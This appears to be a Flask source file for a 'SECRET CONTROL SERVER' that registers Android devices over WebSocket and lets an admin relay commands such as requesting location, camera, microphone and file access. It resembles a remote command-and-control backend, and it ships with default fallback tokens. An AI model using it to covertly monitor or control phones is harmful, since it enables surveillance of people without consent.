import json
import os
import secrets
import threading
from datetime import datetime, timezone

from flask import Flask, jsonify, request, render_template
from flask_sock import Sock

try:
    import psycopg
except Exception:
    psycopg = None


# ============================================================
# APP CONFIGURATION
# ============================================================

app = Flask(
    __name__,
    template_folder="templates",
    static_folder="static"
)

sock = Sock(app)


# ============================================================
# ENVIRONMENT VARIABLES
# ============================================================

ADMIN_TOKEN = os.environ.get(
    "SECRET_ADMIN_TOKEN",
    "change-me-admin-token"
)

DEVICE_TOKEN = os.environ.get(
    "SECRET_DEVICE_TOKEN",
    "change-me-device-token"
)

DATABASE_URL = os.environ.get(
    "DATABASE_URL",
    ""
)


# ============================================================
# DEVICE STORAGE
# ============================================================

devices = {}
devices_lock = threading.Lock()


# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def now_iso():
    return datetime.now(timezone.utc).isoformat()


def admin_ok(req):
    provided_token = req.headers.get(
        "X-Admin-Token",
        ""
    )

    return secrets.compare_digest(
        provided_token,
        ADMIN_TOKEN
    )


def device_ok(req):
    provided_token = req.headers.get(
        "X-Device-Token",
        ""
    )

    return secrets.compare_digest(
        provided_token,
        DEVICE_TOKEN
    )


def db_ping():
    """
    Check PostgreSQL connection if DATABASE_URL exists.
    """

    if not DATABASE_URL or psycopg is None:
        return False

    try:
        with psycopg.connect(
            DATABASE_URL,
            connect_timeout=3
        ) as conn:

            with conn.cursor() as cur:
                cur.execute("SELECT 1")

        return True

    except Exception as exc:
        print(
            f"[DB] Database check failed: {exc}",
            flush=True
        )

        return False


# ============================================================
# BASIC ROUTES
# ============================================================

@app.get("/")
def dashboard():
    return render_template("dashboard.html")


@app.get("/api/health")
def health():
    return jsonify({
        "ok": True,
        "time": now_iso(),
        "database": db_ping(),
        "websocket": "/ws/<device_id>?token=<device_token>",
    })


# ============================================================
# DEVICE REGISTRATION
# ============================================================

@app.post("/api/register")
def register():

    if not device_ok(request):
        print(
            "[REGISTER] Invalid device token",
            flush=True
        )

        return jsonify({
            "error": "invalid device token"
        }), 401

    data = request.get_json(
        silent=True
    ) or {}

    device_id = str(
        data.get("deviceId", "")
    ).strip()

    name = str(
        data.get(
            "name",
            "SECRET Android"
        )
    ).strip()

    if not device_id:
        return jsonify({
            "error": "deviceId is required"
        }), 400

    with devices_lock:

        item = devices.get(
            device_id,
            {}
        )

        item.update({
            "deviceId": device_id,
            "name": name,
            "capabilities": data.get(
                "capabilities",
                {}
            ),
            "appVersion": data.get(
                "appVersion",
                ""
            ),
            "androidVersion": data.get(
                "androidVersion",
                ""
            ),
            "androidSdk": data.get(
                "androidSdk",
                ""
            ),
            "manufacturer": data.get(
                "manufacturer",
                ""
            ),
            "model": data.get(
                "model",
                ""
            ),
            "connected": item.get(
                "connected",
                False
            ),
            "lastSeen": now_iso(),
        })

        devices[device_id] = item

    print(
        f"[REGISTER] Device registered: {device_id}",
        flush=True
    )

    return jsonify({
        "ok": True,
        "deviceId": device_id
    })


# ============================================================
# LIST DEVICES
# ============================================================

@app.get("/api/devices")
def list_devices():

    if not admin_ok(request):

        print(
            "[DEVICES] Unauthorized request",
            flush=True
        )

        return jsonify({
            "error": "unauthorized"
        }), 401

    with devices_lock:

        result = []

        for item in devices.values():

            copy = dict(item)

            # Never return WebSocket object
            copy.pop(
                "ws",
                None
            )

            result.append(copy)

    return jsonify(result)


# ============================================================
# SEND COMMAND TO DEVICE
# ============================================================

@app.post("/api/command/<device_id>")
def send_command(device_id):

    if not admin_ok(request):

        print(
            "[COMMAND] Unauthorized admin request",
            flush=True
        )

        return jsonify({
            "error": "unauthorized"
        }), 401

    data = request.get_json(
        silent=True
    ) or {}

    command = str(
        data.get(
            "command",
            ""
        )
    ).strip()

    allowed = {
        "ping",
        "get_status",
        "request_location",
        "request_camera",
        "request_microphone",
        "open_files",
    }

    if command not in allowed:

        print(
            f"[COMMAND] Unsupported command: {command}",
            flush=True
        )

        return jsonify({
            "error": "unsupported command"
        }), 400

    with devices_lock:

        device = devices.get(
            device_id
        )

        if not device:

            print(
                f"[COMMAND] Device not registered: {device_id}",
                flush=True
            )

            return jsonify({
                "error": "device not registered"
            }), 404

        ws = device.get(
            "ws"
        )

    if ws is None:

        print(
            f"[COMMAND] Device offline: {device_id}",
            flush=True
        )

        return jsonify({
            "error": "device is offline"
        }), 409

    payload = {
        "type": "command",
        "command": command,
        "requestId": secrets.token_hex(8),
        "time": now_iso(),
    }

    try:

        ws.send(
            json.dumps(payload)
        )

        print(
            f"[COMMAND] Sent '{command}' to {device_id}",
            flush=True
        )

        return jsonify({
            "ok": True,
            "requestId": payload["requestId"]
        })

    except Exception as exc:

        print(
            f"[COMMAND] Failed for {device_id}: {exc}",
            flush=True
        )

        return jsonify({
            "error": str(exc)
        }), 500


# ============================================================
# WEBSOCKET CONNECTION
# ============================================================

@sock.route("/ws/<device_id>")
def websocket(ws, device_id):

    print(
        f"[WS] Connection attempt from device: {device_id}",
        flush=True
    )

    # --------------------------------------------------------
    # Get token from URL
    # --------------------------------------------------------

    token = request.args.get(
        "token",
        ""
    )

    print(
        f"[WS] Token received: {'YES' if token else 'NO'}",
        flush=True
    )

    # --------------------------------------------------------
    # Validate token
    # --------------------------------------------------------

    if not secrets.compare_digest(
        token,
        DEVICE_TOKEN
    ):

        print(
            f"[WS] Authentication FAILED: {device_id}",
            flush=True
        )

        try:
            ws.close()
        except Exception:
            pass

        return

    print(
        f"[WS] Authentication SUCCESS: {device_id}",
        flush=True
    )

    # --------------------------------------------------------
    # Register device
    # --------------------------------------------------------

    with devices_lock:

        device = devices.setdefault(
            device_id,
            {
                "deviceId": device_id,
                "name": "SECRET Android",
                "capabilities": {},
            }
        )

        device["connected"] = True

        device["lastSeen"] = now_iso()

        device["ws"] = ws

    print(
        f"[WS] Device connected: {device_id}",
        flush=True
    )

    # --------------------------------------------------------
    # Send connection confirmation
    # --------------------------------------------------------

    try:

        connected_message = {
            "type": "connected",
            "message": (
                "SECRET server connection established"
            ),
            "time": now_iso(),
        }

        ws.send(
            json.dumps(
                connected_message
            )
        )

        print(
            f"[WS] Connected message sent: {device_id}",
            flush=True
        )

        # ----------------------------------------------------
        # Receive messages
        # ----------------------------------------------------

        while True:

            raw = ws.receive()

            # ------------------------------------------------
            # Client disconnected
            # ------------------------------------------------

            if raw is None:

                print(
                    f"[WS] Client closed connection: {device_id}",
                    flush=True
                )

                break

            print(
                f"[WS] Message received from {device_id}",
                flush=True
            )

            # ------------------------------------------------
            # Parse JSON
            # ------------------------------------------------

            try:

                msg = json.loads(
                    raw
                )

            except Exception:

                msg = {
                    "type": "text",
                    "value": raw
                }

            print(
                f"[WS] Message type: {msg.get('type')}",
                flush=True
            )

            # ------------------------------------------------
            # Update device information
            # ------------------------------------------------

            with devices_lock:

                device = devices.get(
                    device_id
                )

                if device:

                    device["lastSeen"] = now_iso()

                    # ----------------------------------------
                    # HELLO MESSAGE
                    # ----------------------------------------

                    if msg.get(
                        "type"
                    ) == "hello":

                        device["name"] = msg.get(
                            "name",
                            device.get(
                                "name",
                                "SECRET Android"
                            )
                        )

                        device["capabilities"] = msg.get(
                            "capabilities",
                            device.get(
                                "capabilities",
                                {}
                            )
                        )

                        device["appVersion"] = msg.get(
                            "appVersion",
                            device.get(
                                "appVersion",
                                ""
                            )
                        )

                        device["androidVersion"] = msg.get(
                            "androidVersion",
                            device.get(
                                "androidVersion",
                                ""
                            )
                        )

                        device["androidSdk"] = msg.get(
                            "androidSdk",
                            device.get(
                                "androidSdk",
                                ""
                            )
                        )

                        device["manufacturer"] = msg.get(
                            "manufacturer",
                            device.get(
                                "manufacturer",
                                ""
                            )
                        )

                        device["model"] = msg.get(
                            "model",
                            device.get(
                                "model",
                                ""
                            )
                        )

                        print(
                            f"[WS] HELLO received from {device_id}",
                            flush=True
                        )

                        print(
                            f"[WS] Device name: "
                            f"{device.get('name')}",
                            flush=True
                        )

                        print(
                            f"[WS] App version: "
                            f"{device.get('appVersion')}",
                            flush=True
                        )

    # --------------------------------------------------------
    # WebSocket exception
    # --------------------------------------------------------

    except Exception as exc:

        print(
            f"[WS] Connection error for {device_id}: {exc}",
            flush=True
        )

    # --------------------------------------------------------
    # Cleanup
    # --------------------------------------------------------

    finally:

        with devices_lock:

            device = devices.get(
                device_id
            )

            if device:

                device["connected"] = False

                device["ws"] = None

                device["lastSeen"] = now_iso()

        print(
            f"[WS] Device disconnected: {device_id}",
            flush=True
        )


# ============================================================
# SERVER START
# ============================================================

if __name__ == "__main__":

    port = int(
        os.environ.get(
            "PORT",
            "5000"
        )
    )

    print(
        "========================================",
        flush=True
    )

    print(
        "        SECRET CONTROL SERVER",
        flush=True
    )

    print(
        "========================================",
        flush=True
    )

    print(
        f"[SERVER] Starting on port {port}",
        flush=True
    )

    print(
        f"[SERVER] Device token configured: "
        f"{'YES' if DEVICE_TOKEN else 'NO'}",
        flush=True
    )

    print(
        "[SERVER] WebSocket route: /ws/<device_id>",
        flush=True
    )

    app.run(
        host="0.0.0.0",
        port=port
    )